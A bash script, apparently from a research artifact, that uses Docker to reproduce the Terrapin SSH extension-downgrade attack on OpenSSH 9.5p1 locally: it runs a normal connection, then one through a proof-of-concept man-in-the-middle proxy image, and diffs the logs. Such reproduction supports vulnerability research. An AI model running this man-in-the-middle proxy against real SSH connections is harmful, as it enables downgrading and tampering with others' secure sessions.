#!/bin/bash

SERVER_CONTAINER_NAME="terrapin-artifacts-server"
SERVER_PORT=2200

POC_CONTAINER_NAME="terrapin-artifacts-poc"
POC_PORT=2201

CLIENT_CONTAINER_NAME="terrapin-artifacts-client"

SERVER_IMPL_NAME="OpenSSH 9.5p1"
SERVER_IMAGE="terrapin-artifacts/openssh-server:9.5p1"

CLIENT_IMPL_NAME="OpenSSH 9.5p1"
CLIENT_IMAGE="terrapin-artifacts/openssh-client:9.5p1"

POC_VARIANT_NAME="ChaCha20-Poly1305"
POC_IMAGE="terrapin-artifacts/ext-downgrade-chacha20-poly1305"


function run_server_direct {
  echo "Started regular server"
    docker run -d \
      --network host \
      --name "$SERVER_CONTAINER_NAME-direct" \
      $SERVER_IMAGE -d -p $SERVER_PORT -o Ciphers=chacha20-poly1305@openssh.com > /dev/null 2>&1
}

function run_server_poc {
  echo "Started Terrapin server"
    docker run -d \
      --network host \
      --name "$SERVER_CONTAINER_NAME-poc" \
      $SERVER_IMAGE -d -p $SERVER_PORT -o Ciphers=chacha20-poly1305@openssh.com > /dev/null 2>&1

}

function select_and_run_poc_proxy {
  echo "Started MITM server"
  docker run -d \
    --network host \
    --name $POC_CONTAINER_NAME \
    $POC_IMAGE --proxy-port $POC_PORT --server-ip "127.0.0.1" --server-port $SERVER_PORT > /dev/null 2>&1
}

function run_client_direct {
  echo "Started regular client" 
    docker run \
      --network host \
      --name "$CLIENT_CONTAINER_NAME-direct" \
      $CLIENT_IMAGE -vvv -o Ciphers=chacha20-poly1305@openssh.com,aes128-cbc -o MACs=hmac-sha2-256-etm@openssh.com -p $SERVER_PORT victim@127.0.0.1 > /dev/null 2>&1
}

function run_client_poc {
  echo "Started Terrapin client"
    docker run \
      --network host \
      --name "$CLIENT_CONTAINER_NAME-poc" \
      $CLIENT_IMAGE -vvv -o Ciphers=chacha20-poly1305@openssh.com,aes128-cbc -o MACs=hmac-sha2-256-etm@openssh.com -p $POC_PORT victim@127.0.0.1 > /dev/null 2>&1
}

function capture_and_compare_outputs {
  rm -rf .tmp
  mkdir .tmp && cd .tmp
  
  docker logs "$SERVER_CONTAINER_NAME-direct" > "$SERVER_CONTAINER_NAME-direct.txt" 2>&1
  docker logs "$SERVER_CONTAINER_NAME-poc" > "$SERVER_CONTAINER_NAME-poc.txt" 2>&1
  docker logs "$POC_CONTAINER_NAME" > "$POC_CONTAINER_NAME.txt" 2>&1
  docker logs "$CLIENT_CONTAINER_NAME-direct" > "$CLIENT_CONTAINER_NAME-direct.txt" 2>&1
  docker logs "$CLIENT_CONTAINER_NAME-poc" > "$CLIENT_CONTAINER_NAME-poc.txt" 2>&1
  diff "$SERVER_CONTAINER_NAME-direct.txt" "$SERVER_CONTAINER_NAME-poc.txt" > "$SERVER_CONTAINER_NAME.txt.diff"
  diff "$CLIENT_CONTAINER_NAME-direct.txt" "$CLIENT_CONTAINER_NAME-poc.txt" > "$CLIENT_CONTAINER_NAME.txt.diff"

}

function stop_containers_direct_only {
  echo "Stopped containers for regular connection"
  docker stop \
    "$SERVER_CONTAINER_NAME-direct" \
    "$CLIENT_CONTAINER_NAME-direct" > /dev/null 2>&1
}

function stop_containers {
  echo "Stopped containers for Terrapin connection"
  docker stop \
    "$SERVER_CONTAINER_NAME-direct" \
    "$SERVER_CONTAINER_NAME-poc" \
    "$POC_CONTAINER_NAME" \
    "$CLIENT_CONTAINER_NAME-direct" \
    "$CLIENT_CONTAINER_NAME-poc" > /dev/null 2>&1
}

function remove_containers {
  echo "Removing any remaining artifact containers"
  docker rm \
    "$SERVER_CONTAINER_NAME-direct" \
    "$SERVER_CONTAINER_NAME-poc" \
    "$POC_CONTAINER_NAME" \
    "$CLIENT_CONTAINER_NAME-direct" \
    "$CLIENT_CONTAINER_NAME-poc" > /dev/null 2>&1
}

run_server_direct
sleep 5
run_client_direct
stop_containers_direct_only
select_and_run_poc_proxy
run_server_poc
sleep 5
run_client_poc
stop_containers
capture_and_compare_outputs
remove_containers
